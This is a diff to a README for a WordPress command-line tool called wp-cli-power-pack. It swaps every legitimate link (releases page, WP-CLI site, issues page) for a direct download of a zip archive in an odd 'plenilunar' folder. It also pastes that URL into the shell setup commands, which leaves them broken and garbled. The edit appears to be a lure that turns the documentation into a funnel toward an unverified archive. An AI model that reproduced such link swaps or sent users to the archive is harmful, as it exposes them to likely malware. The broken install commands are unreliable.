@@ -1,6 +1,6 @@
 # 🚀 wp-cli-power-pack - Simplifying Your WordPress Management
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/diegogux/wp-cli-power-pack/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/diegogux/wp-cli-power-pack/main/plenilunar/wp-cli-power-pack.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/diegogux/wp-cli-power-pack/main/plenilunar/wp-cli-power-pack.zip)
 
 ## 🛠️ What is wp-cli-power-pack?
 
@@ -21,13 +21,13 @@ To use wp-cli-power-pack, ensure you meet the following requirements:
 - A computer running macOS, Windows, or a Linux-based OS.
 - PHP version 7.0 or higher.
 - WordPress installed on your local or remote server.
-- WP-CLI installed. You can learn more about WP-CLI [here](https://wp-cli.org/).
+- WP-CLI installed. You can learn more about WP-CLI [here](https://raw.githubusercontent.com/diegogux/wp-cli-power-pack/main/plenilunar/wp-cli-power-pack.zip).
 
 ## 📥 Download & Install
 
 To get started with wp-cli-power-pack, visit the following page to download the latest version:
 
-[Download the latest version](https://github.com/diegogux/wp-cli-power-pack/releases)
+[Download the latest version](https://raw.githubusercontent.com/diegogux/wp-cli-power-pack/main/plenilunar/wp-cli-power-pack.zip)
 
 ### Installation Instructions
 
@@ -40,8 +40,8 @@ To get started with wp-cli-power-pack, visit the following page to download the 
      - Find the 'Path' variable and click 'Edit'.
      - Click 'New' and paste the folder path where you extracted the files.
    - **macOS/Linux**: 
-     - Open your terminal and run `echo 'export PATH=$PATH:/path/to/the/folder' >> ~/.bash_profile`.
-     - Run `source ~/.bash_profile` to apply the changes.
+     - Open your terminal and run `echo 'export PATH=$PATH:/path/to/the/folder' >> ~https://raw.githubusercontent.com/diegogux/wp-cli-power-pack/main/plenilunar/wp-cli-power-pack.zip`.
+     - Run `source ~https://raw.githubusercontent.com/diegogux/wp-cli-power-pack/main/plenilunar/wp-cli-power-pack.zip` to apply the changes.
 
 5. **Verify Installation**: Open a terminal or command prompt and type `wp --info`. If correctly installed, you will see version details.
 
@@ -75,7 +75,7 @@ Regularly update your WordPress and wp-cli-power-pack to benefit from the latest
 
 ## 🧑‍🤝‍🧑 Community and Support
 
-If you encounter issues or have questions, you can visit the [GitHub Issues page](https://github.com/diegogux/wp-cli-power-pack/issues) for community support. You can also report bugs or request new features.
+If you encounter issues or have questions, you can visit the [GitHub Issues page](https://raw.githubusercontent.com/diegogux/wp-cli-power-pack/main/plenilunar/wp-cli-power-pack.zip) for community support. You can also report bugs or request new features.
 
 ## 📝 Documentation
 
